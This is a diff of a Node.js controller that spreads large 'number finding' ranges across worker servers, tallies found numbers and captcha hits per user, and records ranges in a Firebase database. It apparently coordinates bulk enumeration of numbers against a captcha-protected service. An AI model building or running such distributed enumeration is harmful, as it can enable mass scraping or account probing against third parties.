+            s.running = true
+            s.user = user
+            s.temp = true
+            s.active = Date.now()
+            extra.push(s.id)
+        }
+    }
+
+    let target = Math.min(req.size, 500000)
+
+    users.set(user, {
+        id: user,
+        start: req.number,
+        number: req.number,
+        max: req.number+target,
+        permanent: new Set(fixed),
+        temporary: new Set(extra),
+        delay: req.delay,
+        target: target,
+        found: 0,
+        captcha: 0,
+        recap: 0,
+        other: 0,
+        status: 1,
+        s_time: Date.now(),
+        c_time: Date.now(),
+        key: req.key,
+        send: false
+    })
+
+    await saveData()
+
+    return fixed.concat(extra)
+}
+
+async function saveRequestNumber(req) {
+    let user = String(req.user)
+    let target = Math.min(req.size, 500000)
+    let newRange = { s: req.number, e: req.number + target }
+
+    if (!requestNumber.has(user)) {
+        requestNumber.set(user, new Map())
+    }
+
+    requestNumber.get(user).set(req.key, newRange)
+
+    try {
+        await axios.patch(BASE_URL+'number/'+user+'/'+req.key+'.json', JSON.stringify(newRange), {
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        })
+    } catch (error) {}
+}
+
+async function completedRequestNumber(req) {
+    try {
+        let user = String(req.id)
+        let newRange = { s: req.start, e: req.max, f:req.found }
+
+        if (!requestNumber.has(user)) {
+            let keyMap = new Map()
+            keyMap.set(req.key, newRange)
+            requestNumber.set(user, keyMap)
+        } else {
+            requestNumber.get(user).set(req.key, newRange)
+        }
+
+        if (req.permanent.size + req.temporary.size == 0 || !req.send) {
+            req.send = true
+            try {
+                await axios.patch(BASE_URL+'number/'+user+'/'+req.key+'.json', JSON.stringify(newRange), {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+            } catch (error) {}
+        }
+    } catch (error) {}
+    
+}
+
+async function cancelRequestNumber(req) {
+    let user = String(req.id)
+    let newRange = { s: req.start, e: req.number, f:req.found, c:true }
+
+    if (!requestNumber.has(user)) {
+        let keyMap = new Map()
+        keyMap.set(req.key, newRange)
+        requestNumber.set(user, keyMap)
+    } else {
+        requestNumber.get(user).set(req.key, newRange)
+    }
+
+    try {
+        await axios.patch(BASE_URL+'number/'+user+'/'+req.key+'.json', JSON.stringify(newRange), {
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        })
+    } catch (error) {}
+}
+
+function getFreeServers() {
+    let now = Date.now()
+    let FIVE_MIN = 5 * 60 * 1000
+    return Array.from(servers.values()).filter(s => (!s.running && !s.user) || (s.active && (now - s.active) > FIVE_MIN))
+}
+
+function getTemporyServers() {
+    return Array.from(servers.values()).filter(s => s.temp )
+}
+
+function getRunningUsers() {
+    return Array.from(users.values()).filter(s => s.status === 1)
+}
+
+function getDeadServer() {
+    let now = Date.now()
+    let FIVE_MIN = 5 * 60 * 1000
+    return Array.from(servers.values()).filter(s => s.active && (now - s.active) > FIVE_MIN)
+}
+
+async function runWebSocket(url) {
+
+    let ws = new WebSocket(url, {
+        headers: {
+            'x-client-id': 'founder-server'
+        }
+    })
+
+    ws.on('open', () => {
+        mConnection = ws
+        reconnecting = false
+        ws.send(JSON.stringify({ t: 1, s: 'controller_status' }))
+    })
+
+    ws.on('message', (data, isBinary) => {
+        try {
+            if (!isBinary) {
+                let json = JSON.parse(data.toString())
+
+                if (json.t == 1) {
+                    if (sendCheck.has(json.s)) {
+                        handleWorkerMessage(json.u, json.s, json.f, json.c, json.r, json.o)
+                    }
+                } else if(json.t == 2) {
+                    if (!json.r || json.a > 300) {
+                        handleWorkerMessage(json.u, json.s, 0, 0, 0, 0)
+                    }
+                }
+            }
+        } catch (err) {}
+    })
+
+    ws.on('close', () => {
+        mConnection = null
+        if (!reconnecting) {
+            reconnecting = true
+            setTimeout(() => runWebSocket(url), 3000)
+        }
+    })
+
+    ws.on('error', err => {
+        mConnection = null
+        if (!reconnecting) {
+            reconnecting = true
+            ws.close()
+        }
+    })
+
+    for (let i = 0; i < 30; i++) {
+        if (mConnection) {
+            break
+        }
+        await sleep(1000)
+    }
+}
+
+app.get('/', async (req, res) => {
+    res.end(''+mStart)
+})
+
+app.post('/status', (req, res) => {
+    try {
+        let { user } = req.body
+        let u = users.get(user)
+
+        if (u) {
+            res.json({
+                status: 200,
+                type: u.status,
+                number: u.number,
+                start: u.start,
+                delay: u.delay,
+                found: u.found,
+                captcha: u.captcha,
+                recap: u.recap,
+                other: u.other,
+                s_time: u.s_time,
+                c_time: u.c_time,
+                target: u.target,
+                pending: pendings.indexOf(user)+1,
+                p_server: u.permanent.size,
+                t_server: u.temporary.size,
+            })
+        } else {
+            res.json({ status: 400 })
+        }
+    } catch (err) {
+        res.json({ status: 500 })
+    }
+})
+
+app.get('/log', (req, res) => {
+    try {
+        let runningUsers = getRunningUsers()
+        let tempServers = getTemporyServers()
+        let deadSize = 0
+
+        if (runningUsers.length > 0) {
+            let deadServer = getDeadServer()
+            deadSize = deadServer.length
+        }
+
+        res.json({
+            status: 200,
+            server: servers.size,
+            running: runningUsers.length,
+            free: tempServers.length,
+            pending: pendings.length,
+            queue: queue.length,
+            dead: deadSize,
+            share: SHARE_PER_USER
+        })
+    } catch (err) {
+        res.json({ status: 500 })
+    }
+})
+
+app.get('/log/user', (req, res) => {
+    try {
+        res.setHeader('Content-Type', 'application/json')
+        res.send(JSON.stringify(userStatus(), null, 2))
+    } catch (err) {
+        res.status(500).json({ error: err.message })
+    }
+})
+
+app.get('/log/server', (req, res) => {
+    try {
+        res.setHeader('Content-Type', 'application/json')
+        res.send(JSON.stringify(serverStatus(), null, 2))
+    } catch (err) {
+        res.status(500).json({ error: err.message })
+    }
+})
+
+app.get('/log/all', (req, res) => {
+    try {
+        let runningUsers = getRunningUsers()
+
+        let tempServers = getTemporyServers()
+
+        let deadServer = getDeadServer()        
+
+        res.setHeader('Content-Type', 'application/json')
+        res.send(JSON.stringify({
+            server: servers.size,
+            running: runningUsers.length,
+            free: tempServers.length,
+            pending: pendings.length,
+            queue: queue.length,
+            dead: deadServer.length,
+            share: SHARE_PER_USER,
+            users: userStatus(),
+            servers: serverStatus(),
+            runningList: runningUsers,
+            freeList: tempServers,
+            deadList: deadServer,
+        }, null, 2))
+    } catch (err) {
+        res.status(500).json({ error: err.message })
+    }
+})
+
+app.post('/found', (req, res) => {
+    try {
+        let { number, user, key, size, delay, overload } = req.body
+
+        if (!number || !user || !size) {
+            return res.json({ status: 400, message: 'Required request data not found'  })
+        }
+
+        let u = users.get(String(user))
+        if (u && u.status === 1) {
+            return res.json({ status: 400, message: 'Number finding is already running'  })
+        }
+
+        if (u) {
+            let total = u.permanent.size + u.temporary.size
+            if (total > 0) {
+                return res.json({ status: 400, message: 'Number finding is still in progress'  })
+            }
+        }
+
+        if (pendings.includes(user)) {
+            return res.json({ status: 400, message: 'Number finding is still in pending'  })
+        }
+
+        let result = getNumberStatus(user, number+1, size)
+
+        if (result.type == 200) {
+            queue.push({ number, user, key, size, delay })
+            return res.json({ status: 200, message: 'Number finding successfully added to the queue' })
+        } else if (result.type == 300) {
+            if (overload) {
+                queue.push({ number, user, key, size, delay })
+                return res.json({ status: 200, message: 'Number finding successfully added to the queue' })
+            } else {
+                return res.json({ status: 300, message: result.msg })
+            }
+        } else {
+            return res.json({ status: 400, message: 'This number is currently being used by another user' })
+        }
+    } catch (err) {
+        return res.json({ status: 400, message: 'Server encountered an exception error' })
+    }
+})
+
+app.post('/cancel', async (req, res) => {
+    try {
+        let { user } = req.body
+        if (!user) return res.json({ status: 500, message: 'Required request data not found' })
+
+        let u = users.get(user)
+        if (!u) return res.json({ status: 500, message: 'User data not found'})
+        if (u.status !== 1) return res.json({ status: 400, message: 'Number finding is not running' })
+        
+        u.status = 3
+        u.c_time = Date.now()
+
+        queue = queue.filter(t => String(t.user) !== String(user))
+        pendings = pendings.filter(p => String(p) !== String(user))
+
+        await cancelRequestNumber(u)
+
+        res.json({ status: 200, message: 'Number finding successfully canceled' })
+    } catch (err) {
+        res.json({ status: 500, message: 'Server encountered an exception error' })
+    }
+})
+
+function userStatus() {
+    let status = {}
+    for (let [userId, u] of users.entries()) {
+        status[userId] = {
+            name: mUserName[userId] ?? 'Unknown',
+            status: u.status === 1 ? 'running' : (u.status === 2 ? 'completed' : 'cancelled'),
+            number: u.number,
+            max: u.max,
+            parsent: (((u.number - u.start) / (u.max - u.start)) * 100).toFixed(2)+'%',
+            pending: pendings.indexOf(userId)+1,
+            start: u.start,
+            delay: u.delay,
+            found: u.found,
+            captcha: u.captcha,
+            recap: u.recap,
+            other: u.other,
+            s_time: timeAgo(u.s_time)+' ago',
+            c_time: timeAgo(Date.now() - (u.c_time - u.s_time)),
+            target: u.target,
+            permanent: u.permanent.size,
+            temporary: u.temporary.size,
+        }
+    }
+
+    return status
+}
+
+function serverStatus() {
+    let status = {}
+
+    for (let [sid, s] of servers.entries()) {
+        status[sid] = {
+            running: s.running,
+            user: s.user,
+            temp: s.temp,
+            lastActive: s.active
+        }
+    }
+
+    return status
+}
+
+function sendToWS(data, serverId) {
+    try {
+        sendCheck.add(serverId)
+        if (!mConnection || mConnection.readyState !== WebSocket.OPEN) return false
+        let payload = (typeof data === 'string') ? data : JSON.stringify(data)
+        mConnection.send(payload)
+        return true
+    } catch (err) {
+        return false
+    }
+}
+
+function timeAgo(date) {
+    let now = new Date()
+    let seconds = Math.floor((now - new Date(date)) / 1000)
+
+    let days = Math.floor(seconds / 86400)
+    seconds %= 86400
+
+    let hours = Math.floor(seconds / 3600)
+    seconds %= 3600
+
+    let minutes = Math.floor(seconds / 60)
+
+    let result = ''
+    if (days > 0) result += days + (days === 1 ? ' day ' : ' days ')
+    if (hours > 0) result += hours + (hours === 1 ? ' hour ' : ' hours ')
+    if (minutes > 0 || result === '') result += minutes + (minutes === 1 ? ' minute' : ' minutes')
+
+    return result.trim()
+}
+
+async function serverDataInit() {
+    try {
+        let response = await axios.get(BASE_URL+'server/founder.json')
+        let data = response.data || {}
+
+        for (let id of servers.keys()) {
+            if (!data.hasOwnProperty(id)) {
+                servers.delete(id)
+            }
+        }
+
+        let validServers = new Set(servers.keys())
+
+        for (let user of users.values()) {
+            if (user.permanent) {
+                for (let sid of Array.from(user.permanent)) {
+                    if (!validServers.has(sid)) {
+                        user.permanent.delete(sid)
+                    }
+                }
+            }
+
+            if (user.temporary) {
+                for (let sid of Array.from(user.temporary)) {
+                    if (!validServers.has(sid)) {
+                        user.temporary.delete(sid)
+                    }
+                }
+            }
+        }
+
+        for (let id of Object.keys(data)) {
+            if (!servers.has(id)) {
+                servers.set(id, {
+                    id,
+                    running: false,
+                    user: null,
+                    temp: true,
+                    active: Date.now()
+                })
+            }
+        }
+    } catch (e) {}
+}
+
+async function readUserName() {
+    try {
+        let response = await axios.get(SERVER_URL+'change.json')
+        return response.data || {}
+    } catch (e) {}
+
+    return {}
+}
+
+async function runPrevServer() {
+    for (let [userId, u] of users.entries()) {
+        try {
+            if (u.status == 1) {
+                let permanent = u.permanent
+                let temporary= u.temporary
+                if (permanent.size > 0) {
+                    for (let name of permanent) {
+                        try {
+                            let server = servers.get(name)
+                            if (server && server.user == userId) {
+                                server.active = Date.now()
+                                sendToWS({ t: 4, s: name, d: { t:2, u:userId } }, name)
+                            }
+                        } catch (error) {}
+                    }
+                }
+                if(temporary.size > 0) {
+                    for (let name of temporary) {
+                        try {
+                            let server = servers.get(name)
+                            if (server && server.user == userId) {
+                                server.active = Date.now()
+                                sendToWS({ t: 4, s: name, d: { t:2, u:userId } }, name)
+                            }
+                        } catch (error) {}
+                    }
+                }
+            } else {
+                u.permanent = new Set([])
+                u.temporary = new Set([])
+            }
+        } catch (e) {}
+    }
+}
+
+async function loadOldData() {
+    try {
+        let data = JSON.parse(fs.readFileSync('data.json'))
+        
+        data.users.forEach(([key, value]) => {
+            value.permanent = new Set(value.permanent)
+            value.temporary = new Set(value.temporary)
+            users.set(key, value)
+        })
+
+        data.servers.forEach(([key, value]) => {
+            servers.set(key, value)
+        })
+
+        pendings = data.pendings || []
+
+        let numbers = null
+
+        if (fs.existsSync('numbers.json')) {
+            try {
+                numbers = JSON.parse(fs.readFileSync('numbers.json'))
+            } catch (e) {}
+        } else {
+            let response = await axios.get('https://database088-default-rtdb.firebaseio.com/RRMTSKBRMS/number.json')
+            numbers = response.data
+        }
+
+        if (numbers) {
+            try {
+                for (let user of Object.keys(numbers)) {
+                    let userRequests = new Map()
+
+                    for (let reqId of Object.keys(numbers[user])) {
+                        userRequests.set(reqId, numbers[user][reqId])
+                    }
+
+                    requestNumber.set(user, userRequests)
+                }
+            } catch (error) {
+                requestNumber = new Map()
+            }
+
+            fs.writeFileSync('numbers.json', JSON.stringify(
+                Object.fromEntries(
+                    [...requestNumber].map(([user, userMap]) => [
+                        user,
+                        Object.fromEntries(userMap)
+                    ])
+                )))
+        } else {
+            requestNumber = new Map()
+        }
+    } catch (error) {}
+}
+
+
+function sharePerUser(add) {
+    let runningUsers = getRunningUsers()
+    let totalUsers = runningUsers.length + add
+    let fixed = totalUsers * FIXED_PER_USER
+    let extra = servers.size - fixed
+    if (extra > 0) {
+        return Math.floor(extra / totalUsers)
+    }
+    return 0
+}
+
+function withUserLock(user, fn) {
+    let k = String(user)
+    if (!userLocks.has(k)) userLocks.set(k, Promise.resolve())
+    let chain = userLocks.get(k)
+    let next = chain.then(() => fn()).catch(err => {})
+    userLocks.set(k, next)
+    return next
+}
+
+async function saveData() {
+    try {
+        let now = Date.now()
+        if (lastSave < now) {
+            lastSave = now+10000
+            fs.writeFileSync('data.json', JSON.stringify({
+                users: Array.from(users.entries()).map(([key, value]) => {
+                    return [ key, {
+                        ...value,
+                        permanent: Array.from(value.permanent),
+                        temporary: Array.from(value.temporary)
+                    }]
+                }),
+                servers: Array.from(servers.entries()),
+                pendings: pendings
+            }))
+            
+            fs.writeFileSync('numbers.json', JSON.stringify(
+                Object.fromEntries(
+                    [...requestNumber].map(([user, userMap]) => [
+                        user,
+                        Object.fromEntries(userMap)
+                    ])
+                )))
+        }
+    } catch (error) {}
+
+    return null
+}
+
+function getNumberStatus(targetUser, targetNumber, size) {
+    try {
+        let lastData = {}
+        let closestNext = null
+        let globalInsideData = null 
+
+        for (let [userId, timeMap] of requestNumber.entries()) {
+            let letestKey = 0
+            let insideData = null
+            for (let [timeKey, { s, e, c }] of timeMap.entries()) {
+                let time = parseInt(timeKey)
+                if (targetNumber >= s && targetNumber <= e) {
+                    if (!insideData || e >= insideData.number) {
+                        insideData = { userId, time, number: e, cancel:c }
+                    }
+                }
+
+                if (s >= targetNumber) {
+                    if (!closestNext || s <= closestNext.number) {
+                        closestNext = { userId, timeKey, number: s, cancel:c }
+                    }
+                }
+                
+                if (time > letestKey) {
+                    letestKey = time
+                    lastData[userId] = {
+                        k: parseInt(timeKey),
+                        s, e, c
+                    }
+                }
+            }
+
+            if (insideData) {
+                if (!globalInsideData || insideData.time > globalInsideData.time) {
+                    globalInsideData = insideData
+                }
+            }
+        }
+
+        if (globalInsideData) {
+            let insideData = globalInsideData
+            let letestKey = lastData[insideData.userId]?.k
+            let usedBy = mUserName[insideData.userId] ?? 'Unknown'
+
+            if (letestKey == insideData.time) {
+                if (insideData.cancel) {
+                    return { type: 300, msg: `This numbers previously used by **${usedBy}** at time ${timeAgo(insideData.time*1000)+' ago'}` }
+                } else {
+                    if (targetUser == insideData.userId) {
+                        return { type: 300, msg: `This numbers previously used by **${usedBy}** at time ${timeAgo(insideData.time*1000)+' ago'}` }
+                    } else {
+                        return { type: 400 }
+                    }
+                }
+            } else {
+                return { type: 300, msg: `This numbers previously used by **${usedBy}** at time ${timeAgo(insideData.time*1000)+' ago'}` }
+            }
+        }
+
+        let hasUser = {}
+
+        for (let [key, value] of Object.entries(lastData)) {
+            if ((value.s <= targetNumber && targetNumber <= value.s+TARGET_BLOCK) || (value.e <= targetNumber && targetNumber <= value.e+TARGET_BLOCK)) {
+                if (!value.c) {
+                    hasUser[key] = true
+                }
+            }
+        }
+        
+        if (Object.keys(hasUser).length > 0) {
+            if (!hasUser[targetUser]) {
+                return { type: 400 }
+            }
+        }
+
+        if (closestNext) {
+            if (targetNumber+size > closestNext.number) {
+                return { type: 300, msg: `There are ${Math.floor((targetNumber + size - closestNext.number) / 1000)}K numbers left in ${Math.floor(size / 1000)}K numbers` }
+            }
+        }
+    } catch (error) {}
+
+    return { type: 200 }
+}
+
 
 function decode(data) {
     return Buffer.from(data, 'base64').toString('utf-8')
 }
 
-function delay(time) {
+function sleep(time) {
     return new Promise(function(resolve) {
         setTimeout(resolve, time)
     })
